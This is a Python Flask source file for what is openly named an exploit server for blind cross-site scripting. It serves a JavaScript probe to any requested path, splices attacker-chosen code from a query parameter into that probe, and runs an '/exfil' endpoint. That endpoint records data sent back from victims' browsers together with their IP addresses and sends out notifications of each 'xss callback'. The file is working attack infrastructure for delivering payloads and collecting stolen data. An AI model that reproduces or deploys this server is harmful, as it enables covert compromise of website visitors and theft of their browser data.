#!/usr/bin/python
from flask import Flask, request, Response
from db import create_connection, insert_interaction, create_db
from flask_cors import CORS
from subprocess import run, PIPE
import mimetypes
import logging
import time
import os

database = r"/var/www/exploit_srv/sqlite.db"

app = Flask(__name__)
CORS(app, supports_credentials=True)

formatter = logging.Formatter(fmt='%(asctime)s %(levelname)-8s %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
handler = logging.FileHandler("/var/www/exploit_srv/api.log")
handler.setFormatter(formatter)
app.logger.addHandler(handler)
app.logger.setLevel(logging.INFO)

@app.route('/', defaults={'path': ''},methods = ['POST','GET','PUT','PATCH','DELETE'])
@app.route('/<path:path>',methods = ['POST','GET','PUT','PATCH','DELETE'])
def deliver_probe(path):
    web_root = os.path.dirname(app.instance_path) + "/www/"
    commonprefix = os.path.commonprefix((os.path.realpath(web_root + path), web_root))
    if commonprefix != web_root and commonprefix+"/" != web_root:
        return "Forbidden", 403

    if os.path.isfile(web_root + path) != True:
        path = 'probe.js'

    mime_type, encoding = mimetypes.guess_type(web_root + path)
    with open(web_root + path, "r", encoding="utf8") as file_handler:
        content = file_handler.read()

    domain = request.host
    eval = request.args.get( 'e' )
    if eval is None:
        eval = ""

    content = content.replace( '[HOSTNAME]', domain )
    content = content.replace( '[HOST_URL]', "https://" + domain )
    content = content.replace( '[CHAINLOAD_REPLACE_ME]', eval )

    return Response(content, mimetype=mime_type)

@app.route('/exfil', methods=['POST'])
def exfil():
    app.logger.info('Recording callback')

    json = request.get_json(force=True)
    json['client_ip'] = request.remote_addr
    app.logger.info(json)

    notificationText='xss callback from {}|{}\n'.format(json['client_ip'],json['url'])
    run(['/var/www/exploit_srv/notify.sh', 'xss'], stdout=PIPE, input=notificationText.encode('utf-8'))

    try:
        conn = create_connection(database)
        insert_interaction(conn, json)
    except Exception as e:
        app.logger.error(e)
    finally:
        conn.close()

    return "ok"

@app.route('/shutdown_asdf', methods=['POST'])
def shutdown():
    app.logger.info('shutting down')
    run(['/var/www/exploit_srv/shutdown.sh'])
    return "ok"

@app.route('/delay/<delay>', methods=['GET'])
def delay(delay=0):
    app.logger.info(f'delay {delay}')
    time.sleep(delay)
    return "ok"

app.logger.info('Starting exploit_srv')

conn = create_connection(database)
try:
    create_db(conn)
finally:
    conn.close()
